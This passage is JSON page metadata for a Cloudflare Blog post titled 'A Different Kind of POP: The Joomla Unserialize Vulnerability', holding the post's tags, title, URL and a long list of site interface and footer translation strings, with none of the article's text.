				"slug": "vulnerabilities"
			},
			{
				"id": "5g1zXi7BQUDHFLRaX2FPzJ",
				"name": "Joomla",
				"slug": "joomla"
			},
			{
				"id": "6lhzEBz2B56RKa4nUEAGYJ",
				"name": "Programming",
				"slug": "programming"
			}
		],
		"title": "A Different Kind of POP: The Joomla Unserialize Vulnerability",
		"updated_at": "2024-08-27T02:36:42.949Z",
		"url": "https://blog.cloudflare.com/the-joomla-unserialize-vulnerability"
	},
	"translations": {
		"posts.by": "By",
		"footer.gdpr": "GDPR",
		"lang_blurb1": "This post is also available in {lang1}.",
		"lang_blurb2": "This post is also available in {lang1} and {lang2}.",
		"lang_blurb3": "This post is also available in {lang1}, {lang2} and {lang3}.",
		"footer.blurb": "Cloudflare's connectivity cloud protects <a target='_blank' href='https://www.cloudflare.com/network-services/' rel='noreferrer'>entire corporate networks</a>, helps customers build <a target='_blank' href='https://workers.cloudflare.com/' rel='noreferrer'>Internet-scale applications efficiently</a>, accelerates any <a target='_blank' href='https://www.cloudflare.com/performance/accelerate-internet-applications/' rel='noreferrer'>website or Internet application</a>, <a target='_blank' href='https://www.cloudflare.com/ddos/' rel='noreferrer'>wards off DDoS attacks</a>, keeps <a target='_blank' href='https://www.cloudflare.com/application-security/' rel='noreferrer'>hackers at bay</a>, and can help you on <a target='_blank' href='https://www.cloudflare.com/products/zero-trust/' rel='noreferrer'>your journey to Zero Trust</a>.<br/><br/>Visit <a target='_blank' href='https://one.one.one.one/' rel='noreferrer'>1.1.1.1</a> from any device to get started with our free app that makes your Internet faster and safer.<br/><br/>To learn more about our mission to help build a better Internet, <a target='_blank' href='https://www.cloudflare.com/learning/what-is-cloudflare/' rel='noreferrer'>start here</a>. If you&apos;re looking for a new career direction, check out <a target='_blank' href='http://www.cloudflare.com/careers' rel='noreferrer'>our open positions</a>.",
		"footer.press": "Press",
		"header.title": "The Cloudflare Blog",
		"footer.careers": "Careers",
		"footer.company": "Company",
		"footer.support": "Support",
		"footer.the_net": "theNet",
		"footer.our_team": "Our team",
		"footer.webinars": "Webinars",
		"page.more_posts": "More posts",
		"posts.time_read": "{time} min read",
		"footer.community": "Community",
		"footer.resources": "Resources",
		"footer.solutions": "Solutions",
		"footer.trademark": "Trademark",
		"header.subscribe": "Subscribe",
		"footer.compliance": "Compliance",
		"footer.free_plans": "Free plans",
		"footer.impact_ESG": "Impact/ESG",
		"posts.follow_on_X": "Follow on X",
		"footer.help_center": "Help center",
		"footer.network_map": "Network Map",
		"header.please_wait": "Please Wait",
		"page.related_posts": "Related posts",
		"footer.case_studies": "Case Studies",
		"footer.connect_2024": "Connect 2024",
		"footer.terms_of_use": "Terms of Use",
		"footer.white_papers": "White Papers",
		"footer.cloudflare_tv": "Cloudflare TV",
		"footer.community_hub": "Community Hub",
		"footer.compare_plans": "Compare plans",
		"footer.contact_sales": "Contact Sales",
		"header.contact_sales": "Contact Sales",
		"header.email_address": "Email Address",
		"page.error.not_found": "Page not found",
		"footer.developer_docs": "Developer docs",
		"footer.privacy_policy": "Privacy Policy",
		"footer.request_a_demo": "Request a demo",
		"page.continue_reading": "Continue reading",
		"footer.analysts_report": "Analyst reports",
		"footer.for_enterprises": "For enterprises",
		"footer.getting_started": "Getting Started",
		"footer.learning_center": "Learning Center",
		"footer.project_galileo": "Project Galileo",
		"pagination.newer_posts": "Newer Posts",
		"pagination.older_posts": "Older Posts",
		"posts.social_buttons.x": "Discuss on X",
		"footer.about_cloudflare": "About Cloudflare",
		"footer.athenian_project": "Athenian Project",
		"footer.become_a_partner": "Become a partner",
		"footer.cloudflare_radar": "Cloudflare Radar",
		"footer.network_services": "Network services",
		"footer.trust_and_safety": "Trust & Safety",
		"header.get_started_free": "Get Started Free",
		"page.search.placeholder": "Search Cloudflare",
		"footer.cloudflare_status": "Cloudflare Status",
		"footer.cookie_preference": "Cookie Preferences",
		"header.valid_email_error": "Must be valid email.",
		"footer.connectivity_cloud": "Connectivity cloud",
		"footer.developer_services": "Developer services",
		"footer.investor_relations": "Investor relations",
		"page.not_found.error_code": "Error Code: 404",
		"footer.logos_and_press_kit": "Logos & press kit",
		"footer.application_services": "Application services",
		"footer.get_a_recommendation": "Get a recommendation",
		"posts.social_buttons.reddit": "Discuss on Reddit",
		"footer.sse_and_sase_services": "SSE and SASE services",
		"page.not_found.outdated_link": "You may have used an outdated link, or you may have typed the address incorrectly.",
		"footer.report_security_issues": "Report Security Issues",
		"page.error.error_message_page": "Sorry, we can't find the page you are looking for.",
		"header.subscribe_notifications": "Subscribe to receive notifications of new posts:",
		"footer.cloudflare_for_campaigns": "Cloudflare for Campaigns",
		"header.subscription_confimation": "Subscription confirmed. Thank you for subscribing!",
		"posts.social_buttons.hackernews": "Discuss on Hacker News",
		"footer.diversity_equity_inclusion": "Diversity, equity & inclusion",
		"footer.critical_infrastructure_defense_project": "Critical Infrastructure Defense Project"
	}
}